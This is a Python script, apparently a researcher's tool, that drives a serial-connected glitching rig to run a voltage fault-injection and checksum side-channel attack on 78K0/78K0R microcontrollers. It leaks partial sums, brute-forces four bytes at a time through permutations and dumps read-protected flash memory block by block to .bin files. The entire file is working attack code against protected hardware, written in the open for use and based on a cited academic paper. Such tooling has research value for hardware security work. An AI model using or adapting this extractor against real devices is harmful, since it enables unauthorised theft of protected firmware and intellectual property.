"""
    Author: Andrew G Belcher
    Date: 4th of September, 2020
    Email: AndrewGBelcher@outlook.com
    
    There is no copyright or responsibility accepted for the use
    of this software.

    Description:
        
        Sequential flash leaker attack interface for 78K0/78K0R devices.

        Developed based on the attack outline by Claudio Bozzato, Riccardo Focardi,
        and Francesco Palmarini in their paper 
        "Shaping the Glitch: Optimizing Voltage Fault Injection Attacks".       
"""

import serial
import time
import threading
import struct
import os
import sys
import itertools
from random import randint
from random import random
from itertools import permutations
from itertools import combinations
from itertools import combinations_with_replacement

leaked_bytes = []
byte_sums = []
confirmed_bytes = []
permuts = []
correct_guesses = []
guess_count = 0
guess_buffer_size = 4 * 10000
interface_baud = 1000000 # 500000
interface_port = 'COM12' # '/dev/ttyS12'

#  send our 4 byte guesses over and attempt to crack 4 targeted bytes in flash
def verify_guesses(ser, block_num, block_index, correct_guesses_cleaned, guess_count, block_bytes):

    guess_index = 0
    tmp_index = 0
    found = False
    answer = ""

    print("in verify")
    print("correct guess size " + str(len(correct_guesses_cleaned)))
    print(correct_guesses_cleaned[0:1])

    # if the amount of guesses where indexing to end is still above the buffer size
    # truncate to buffer size

    print("updating verify")
    print("guess index:" + str(guess_index))
    print("block index:" + str(block_index))

    if block_index > 0:
        ser.write("update_verify")

        while ser.readline() != "uv\n":
            pass

        print("update verify passed")
        ser.write(str(4*block_index))
        time.sleep(1)

        while ser.readline() != str(4*block_index):
            pass

        print("update verify block index passed")

        for x in block_bytes:
            ser.write(struct.pack('>B', x))        

        while ser.readline() != "dr\n":
            pass

        print("update verify done reading")
    
        time.sleep(1)


    while(guess_index < len(correct_guesses_cleaned) and not found):


        print("updating guesses..")


        # split and send guesses in chunks if its over the buffer size
        if(len(correct_guesses_cleaned[guess_index:]) > guess_buffer_size):

            ser.write("update_guess")

            while ser.readline() != "ug\n":
                pass

            print("-split- about to write: " + str(guess_buffer_size))
            print("-split- count of elem: " + str(len(correct_guesses_cleaned[guess_index:guess_index+guess_buffer_size])/4))
            print("-split- count of bytes: " + str(len(correct_guesses_cleaned[guess_index:guess_index+guess_buffer_size])))

            ser.write(str(len(correct_guesses_cleaned[guess_index:guess_index+guess_buffer_size])))

            while ser.readline() != str(len(correct_guesses_cleaned[guess_index:guess_index+guess_buffer_size])):
                pass

            print("correct len recvd")

            for set in correct_guesses_cleaned[guess_index:guess_index+guess_buffer_size]:
                for byte in set:
                    ser.write(struct.pack('>B', byte))
                tmp_index = tmp_index + 1
            guess_index = tmp_index

            print("done writing (split)")

            while ser.readline() != "dr\n":
                pass    

            print("done reading (split)")

            time.sleep(1)

        
        # guess size under buffer size so send 1 chunk
        else:
        
            ser.write("update_guess")

            while ser.readline() != "ug\n":
                pass

            print("about to write: " + str(len(correct_guesses_cleaned[guess_index:])))
            print("count of elem: " + str(len(correct_guesses_cleaned[guess_index:])/4))
            print("count of bytes: " + str(len(correct_guesses_cleaned[guess_index:])))

            ser.write( str( len(correct_guesses_cleaned[guess_index:])*4) )

            while ser.readline() != str(len(correct_guesses_cleaned[guess_index:])*4):
                pass

            print("correct len recvd")

            for set in correct_guesses_cleaned[guess_index:]:
                for byte in set:
                    ser.write(struct.pack('>B', byte))
                tmp_index = tmp_index + 1
            guess_index = tmp_index

            print("done writing")

            while ser.readline() != "dr\n":
                pass    

            print("done reading")

            time.sleep(1)


        # now verify

        print("running verify")

        ser.write("short_verify")

        while ser.readline() != "sv\n":
            pass

        print("verify block num")

        ser.write(str(block_num))

        while ser.readline() != str(block_num):
            pass

        print("verify block index")

        ser.write(str(block_index)+"\n")

        while ser.readline() != str(str(block_index)+"\n"):
            pass

        print("verify block index recvd")

        cracking = True

        while cracking:
            line = ser.readline()
            if(line != ""):
                if(line == "svfound\n" ):
                    sys.stdout.write("\n")
                    print(line)
        
                    answer = ser.readline()
                    print(answer)
                    print("bytes are:" + hex(int(answer[0:2],16)) + " " + hex(int(answer[2:4],16)) + " " + hex(int(answer[4:6],16)) + " " + hex(int(answer[6:8],16)))

                    cracking = False
                    found = True

                elif(line == "svfailed"):
                    answer = ""
                    print(line)
                    cracking = False   
                    found = False

    return found, answer





# load leaked bytes from a file xxxx yyyy zzzz
def leak_bytes_debug(leaked_bytes, block_num, block_index):

    BLK_CHECKSUM = 0x881d
    file = open("./testchecksums.txt", mode = 'r')
    lines = file.readlines()

    parse_checksum_leak_lines(leaked_bytes, lines,BLK_CHECKSUM)

    file.close()


# leak bytes from the block checksum cmd
def leak_bytes(ser, leaked_bytes, block_num, block_index, first_run):

    print("entering leak mode")
    ser.write("checksum_leak")

    while ser.readline() != "cl\n":
        pass

    print("writing cl block num")

    ser.write(str(block_num))

    while ser.readline() != str(block_num):
        pass

    print("writing cl block index")

    # often needs tweaking
    slide = randint(0, 2)

    # depending on the device block_index * n needs tweaking
    ser.write(str((14 + slide) + (block_index*13)))

    while ser.readline() != str((14 + slide) + (block_index*13)):
        pass

    print("writing cl range")

    # needs changing depending on how long each 4 bytes are processed
    ser.write(str(10000))

    while ser.readline() != str(10000):
        pass

    ser.write(str("1"))

    l = ""
    BLK_CHECKSUM = 0    

    while l == str(""):
        l = ser.readline()

    BLK_CHECKSUM = int(l, 10)

    print("BLK_CHECKSUM:" + hex(BLK_CHECKSUM))
    
    time.sleep(1)

    # write how many leaks to perform before generating guesses
    # number should vary depending on placement or number of false positives
    ser.write(str(60))

    lines = []
    leaking = True

    while leaking:
        line = ser.readline()
        if(line != "" and line != "cldone"):
            print(line.split("\n")[0])
            lines.append(line)

        if(line == "cldone"):
            leaking = False

    parse_checksum_leak_lines(leaked_bytes, lines, BLK_CHECKSUM)




# parse data fed from driver during byte leaking during checksum operation, record potential leaked bytes of the target 4 byte section
def parse_checksum_leak_lines(leaked_bytes, lines, BLK_CHECKSUM):
    print("parsing..")
    for line in lines:
        line = line.split(' ')
        line = [i.strip() for i in line]

        diff = int(line[1],16) - BLK_CHECKSUM

        if (diff <= 0x3fc and diff >= 0) or (diff >= -0x3fc and diff <= 0):
            if(diff < 0x100 and diff >= 0) or (diff >= -0x100 and diff <= 0):
                leaked_bytes.append(diff&0xff)


        diff = BLK_CHECKSUM - int(line[1],16)

        if (diff <= 0x3fc and diff >= 0) or (diff >= -0x3fc and diff <= 0):
            if(diff < 0x100 and diff >= 0) or (diff >= -0x100 and diff <= 0):
                leaked_bytes.append(diff & 0xff)
 
    


    cleaned_leaks = []
    for b in leaked_bytes:
        if b not in cleaned_leaks:
            cleaned_leaks.append(b)

    leaked_bytes = cleaned_leaks

    print(leaked_bytes)
    print(byte_sums)




# create permutations using 4th as remainder with 3 leaked byte combinations
def create_permutations(leaked_bytes, byte_sums, correct_guesses, block_index, block_num, byte_sum):

    comb = list(combinations_with_replacement(leaked_bytes, 3))
    acc = 0
    guess_count = 0
    new_guess_count = 0
    byte_sum = 0
    new_list = []
    correct_guesses_cleaned = []

    for c in comb:
        acc = 0
        tmp_list = []

        for byte in c:
            acc += byte
            tmp_list.append(byte)

        if((byte_sum - acc) >= 0 and (byte_sum - acc) < 0x100): 
            tmp_list.append(byte_sum-acc)
            new_list.append(tmp_list)

            permuts =list(permutations(tmp_list, 4))
            for pset in permuts:
                guess_count = guess_count + 1
                if pset not in correct_guesses_cleaned: 
                    correct_guesses_cleaned.append(pset) 
                    new_guess_count = new_guess_count + 1


    print("guess count before cleaning: " + str(guess_count))
    print("guess count after cleaning " + str(new_guess_count))

    correct_guesses = correct_guesses_cleaned

    return correct_guesses




# create permutations using 4 leaked byte combinations
def create_permutations_4bytes(leaked_bytes, byte_sums, correct_guesses, block_index, block_num, byte_sum):

    # always add 0s/0xffs for quick detection
    if(len(leaked_bytes) < 1):
        leaked_bytes.append(0x00)
        leaked_bytes.append(0xff)

    comb = list(combinations_with_replacement(leaked_bytes,4))

    acc = 0
    guess_count = 0
    new_guess_count = 0
    correct_guesses_cleaned = []

    for c in comb:
        acc = 0
        tmp_list = []

        for byte in c:
            acc += byte
            tmp_list.append(byte)

        if acc == byte_sum:
            permuts = list(permutations(tmp_list, 4))
            for pset in permuts:
                guess_count = guess_count + 1
                if pset not in correct_guesses_cleaned: 
                    correct_guesses_cleaned.append(pset) 
                    new_guess_count = new_guess_count + 1
            permuts = None
    comb = None

    print("guess count before cleaning: " + str(guess_count))
    print("guess count after cleaning " + str(new_guess_count))

    correct_guesses = correct_guesses_cleaned

    return correct_guesses




# verify the bytes that exist in the block_bytes list
def verify_static(ser, block_num, block_bytes):

    print("updating verify")

    ser.write("update_verify")

    while ser.readline() != "uv\n":
        pass

    ser.write(str(len(block_bytes)))

    while ser.readline() != str(len(block_bytes)):
        pass

    for x in block_bytes:
        ser.write(struct.pack('>B', x))        

    while ser.readline() != "dr\n":
        pass

    time.sleep(1)
    
    ser.write("update_guess")

    while ser.readline() != "ug\n":
        pass


    ser.write(str(4))

    while ser.readline() != str(4):
        pass

    ser.write(struct.pack('>B', block_bytes[-4]))        
    ser.write(struct.pack('>B', block_bytes[-3]))        
    ser.write(struct.pack('>B', block_bytes[-2]))        
    ser.write(struct.pack('>B', block_bytes[-1]))        


    while ser.readline() != "dr\n":
        pass  

    time.sleep(1)

    print("running verify")

    ser.write("short_verify")

    while ser.readline() != "sv\n":
        pass

    print("verify block num")

    ser.write(str(block_num))

    while ser.readline() != str(block_num):
        pass

    print("verify block index")

    ser.write(str((len(block_bytes)/4)-1)+"\n")

    while ser.readline() != str(str((len(block_bytes)/4)-1)+"\n"):
        pass

    print("verify block index recvd")

    cracking = True

    answer = ""

    while cracking:
        line = ser.readline()
        if(line != ""):
            if(line == "svfound\n" ):
                print(line)
                answer = ser.readline()

                print(answer)
                print("bytes are:" + hex(int(answer[0:2],16)) + " " + hex(int(answer[2:4],16)) + " " + hex(int(answer[4:6],16)) + " " + hex(int(answer[6:8],16)))

                cracking = False
                found = True

            elif(line == "svfailed"):
                print(line)
                cracking = False   
                found = False

            else:
                sys.stdout.write(line.split(str(block_bytes[-4:-3]) + " " + str(block_bytes[-3:-2]) + " " + str(block_bytes[-2:-1]) + " " + str(block_bytes[-1:]))[1] + "\r")
                print(line)

    return found, answer




# leak checksum for 4 targeted bytes
def leak_sum(ser, blocknum, block_index):

    sum = 0xffff

    # 0xff + 0xff + 0xff + 0xff = 0x3fc o r 0x2c7/0x2a6 are false positives
    while(((sum > 0x3fc) or (sum == 0x2c7 or sum == 0x2a6))):

        ser.write("checksum_leak_short")

        while ser.readline() != "cls\n":
            pass

        print("sending blocknum")
        ser.write(str(blocknum))
        while ser.readline() != str(blocknum):
            pass    

        print("sending block index:" + str(block_index))
        ser.write(str(block_index))
        while ser.readline() != str(block_index):
            pass    

        print("getting block checksum")


        l = ""
        BLK_CHECKSUM = 0    

        while l == str(""):
            l = ser.readline()

        BLK_CHECKSUM = int(l, 10)

        print("BLK_CHECKSUM:" + hex(BLK_CHECKSUM))
        

        line = []
        leak = ""
        leaking = True

        while leaking:
            line = ser.readline()
            if(line != "" and line != "clsdone"):
                print(line)
                leak = line

            if(line == "clsdone"):
                leaking = False

        leak_line = leak.split(' ')
        leak_line_data = [i.strip() for i in leak_line]

        sum = 0x10000 - int(leak_line_data[1],16)
        print("sum:" + hex(sum))
        
    print("Found sum:" + hex(sum))

    return sum




# main sub for connecting and performing the side channel attack to sequentially dump 4 bytes of the flash to a file upon successful guessing
def main():

    ser = serial.Serial(
        port=interface_port,\
        baudrate=interface_baud,\
        parity=serial.PARITY_NONE,\
        stopbits=serial.STOPBITS_ONE,\
        bytesize=serial.EIGHTBITS,\
        timeout=0)


    blocknum = 107
    first_run = True

    while True:
        block_bytes = []
        block_file = str(blocknum) + ".bin"
        file = open(block_file, mode = 'w+')
        file.close()

        while(len(block_bytes) < 0x100):

          #  verify_static(ser, blocknum, block_bytes)

            block_index = (len(block_bytes)/4)


            found = False
            answer = ""
            byte_sum = 0
            first_run = True

            static_guesses = [[0x00, 0x00, 0x00, 0x00],[0xff, 0xff, 0xff, 0xff]]
            found, answer = verify_guesses(ser, blocknum, block_index, static_guesses, guess_count, block_bytes)

            while not found:
                leaked_bytes = []
                print("finding sum")

                if(byte_sum == 0):
                    byte_sum = leak_sum(ser, blocknum, block_index)

                print("leaking bytes..")
                leak_bytes(ser, leaked_bytes, blocknum, block_index, first_run)

                #leak_bytes_debug(leaked_bytes,132,1)
                print("creating permutations..")
                
                correct_guesses = []

                correct_guesses = create_permutations_4bytes(leaked_bytes, byte_sums, correct_guesses, block_index, blocknum, byte_sum)
                #correct_guesses = create_permutations(leaked_bytes, byte_sums, correct_guesses, block_index, blocknum, byte_sum)

                print("cracking bytes..")
                found, answer = verify_guesses(ser, blocknum, block_index, correct_guesses, guess_count, block_bytes)
                
                first_run = False

            print("answer is: " + answer)

            block_bytes.append(int(answer[0:2],16))
            block_bytes.append(int(answer[2:4],16))
            block_bytes.append(int(answer[4:6],16))
            block_bytes.append(int(answer[6:8],16))

            with open(block_file, mode = 'wb') as dump:
                for b in block_bytes:
                    dump.write(struct.pack('>B', b))

                dump.close()

        blocknum = blocknum-1

    ser.close()



sys.setrecursionlimit(2097152)    # adjust numbers
threading.stack_size(134217728)   # for your needs



# run script using pypy in order to speed up permutations generation
if __name__ == '__main__':
    main()
